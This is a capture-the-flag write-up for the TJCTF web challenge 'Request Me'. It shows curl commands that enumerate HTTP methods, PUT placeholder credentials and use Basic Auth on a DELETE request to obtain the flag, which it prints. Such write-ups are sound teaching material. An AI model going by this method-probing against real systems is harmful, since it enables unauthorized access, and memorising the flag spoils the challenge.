# Request Me
Web - 30 points

## Challenge 

Written by okulkarni

[Request Me](https://request_me.tjctf.org/)

## Solution

The page has a link to google "http request options"

So now requesting for OPTIONS, we see this

	$ curl -X OPTIONS https://request_me.tjctf.org/ 
	GET, POST, PUT, DELETE, OPTIONS
	Parameters: username, password
	Some methods require HTTP Basic Auth

Trying out the other request method

	$ curl -X POST https://request_me.tjctf.org/
	Could not verify your access level for that URL.
	You have to login with proper credentials

	$ curl -X PUT https://request_me.tjctf.org/
	I couldn't steal your credentials! Where did you hide them?

Seems like we can PUT some data

	$ curl -X PUT --data "username=admin&password=123" https://request_me.tjctf.org/
	I stole your credentials!
 
Now try to login using HTTP Basic Auth on the DELETE method

	$ curl -X DELETE -u admin:123 https://request_me.tjctf.org/
	Finally! The flag is tjctf{wHy_4re_th3r3_s0_m4ny_Opt10nS}

## Flag

	tjctf{wHy_4re_th3r3_s0_m4ny_Opt10nS}
